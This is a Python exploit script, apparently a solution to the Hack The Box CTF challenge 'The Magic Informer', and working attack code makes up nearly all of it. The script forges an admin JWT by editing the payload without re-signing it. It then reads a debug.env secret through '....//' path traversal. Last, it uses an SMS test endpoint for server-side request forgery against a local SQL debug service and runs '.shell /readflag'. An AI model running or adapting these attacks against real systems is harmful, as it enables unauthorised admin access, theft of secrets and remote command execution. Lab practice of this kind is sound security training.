import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def register(s, url):
	register_path = url + '/api/register'
	login_path = url + '/api/login'
	data = {'username': 'gwyo', 'password': 'password123'}
	print('\n[+] Trying to register to the application...')
	r = s.post(register_path, json=data)
	print(r.text)
	time.sleep(1)
	print('\n[+] Trying to login to the application...')
	r = s.post(login_path, json=data)
	print(r.text)
	time.sleep(1)
	jwt_token = s.cookies['session']
	print('[+] Found JWT managed session cookie:\t\t%s' % jwt_token)
	return jwt_token

def get_admin(s, url, token):
	print("\n[+] Trying to change user manipulating JWT's data...")
	dashb_path = url + '/dashboard'
	p1, p2, p3 = token.split('.')
	time.sleep(1)
	print(p2)
	p2_decoded = base64.b64decode(p2)
	time.sleep(1)
	print(p2_decoded)
	p2_modified = p2_decoded.replace(b'gwyo', b'admin')
	time.sleep(1)
	print(p2_modified)
	p2_reenc = base64.b64encode(p2_modified).decode().replace('=', '')
	time.sleep(1)
	print(p2_reenc)
	new_jwt = p1 + '.' + p2_reenc + '.' + p3
	time.sleep(1)
	print(new_jwt)
	cookies = {'session': new_jwt}
	s.cookies.clear()
	r = s.get(dashb_path, cookies=cookies, allow_redirects=False)
	time.sleep(1)
	if r.headers['Location'] == '/admin':
		print("[+] Successfully upgraded session with admin rights !")
		return new_jwt
	return False

def get_debug_pass(s, url, token):
	cookies = {'session': token}
	print("\n[+] Trying to retrieve the DEBUG_PASS value through Path Traversal...")
	path = url + '/download?resume=....//....//....//....//....//....//app/debug.env'
	print(path)
	r = s.get(path, cookies=cookies)
	time.sleep(1)
	print(r.text)
	time.sleep(1)
	return r.text.split('=')[1].strip()

def get_flag(s, url, token, debug_pass):
	print("\n[+] Trying to send a SQL request through the API...")
	cookies = {'session': token}
	exec_path = 'http://127.0.0.1:1337/debug/sql/exec'
	test_sms_path = url + '/api/sms/test'
	sql_cmd = 'select * from users;'
	readflag_cmd = '.shell /readflag;'
	sms_data = {
		"verb": "POST",
		"url": exec_path,
		"params": f"\n{{\"sql\":\"{sql_cmd}\",\"password\":\"{debug_pass}\"}}",
		"headers": f"Content-Type: application/json\nCookie: session={token}",
		"resp_ok":"<status>ok</status>",
		"resp_bad":"<status>error</status>"
	}
	print(sms_data)
	time.sleep(1)
	r = s.post(test_sms_path, json=sms_data, cookies=cookies)
	print('')
	print(r.text)
	time.sleep(1)
	print("\n[+] Trying to send a SQL request to exec the readflag binary...")
	sms_data = {
		"verb": "POST",
		"url": exec_path,
		"params": f"\n{{\"sql\":\"{readflag_cmd}\",\"password\":\"{debug_pass}\"}}",
		"headers": f"Content-Type: application/json\nCookie: session={token}",
		"resp_ok":"<status>ok</status>",
		"resp_bad":"<status>error</status>"
	}
	print(sms_data)
	time.sleep(1)
	print('')
	r = s.post(test_sms_path, json=sms_data, cookies=cookies)
	time.sleep(1)
	flag = re.search(rb'"output":"(.*)"}"', r.text.encode().replace(b'\\n', b'').replace(b'\\', b'')).group(1).decode()
	if 'HTB' in flag:
		print(flag)

def show_usage():
	print('[+] Usage: %s <TARGET>' % sys.argv[0])
	print('[+] Example: %s 127.0.0.1:1337' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] HTB Challenge: The Magic Informer')
	try:
		url = 'http://' + sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Vulnerabilities to execute /readflag on the target and retrieve the output\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			print('[+] Trying to find href links on the home page...\n')
			soup = BeautifulSoup(r.content, 'html.parser')
			link = soup.find("a", {'class':'item-with-image magazine with-border toggles'})
			href = link['href']
			print('[+] Found href link:\t\t%s' % href)
			token = register(s, url)
			new_token = get_admin(s, url, token)
			debug_pass = get_debug_pass(s, url, new_token)
			get_flag(s, url, new_token, debug_pass)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(1)

if __name__ == "__main__":
	main()
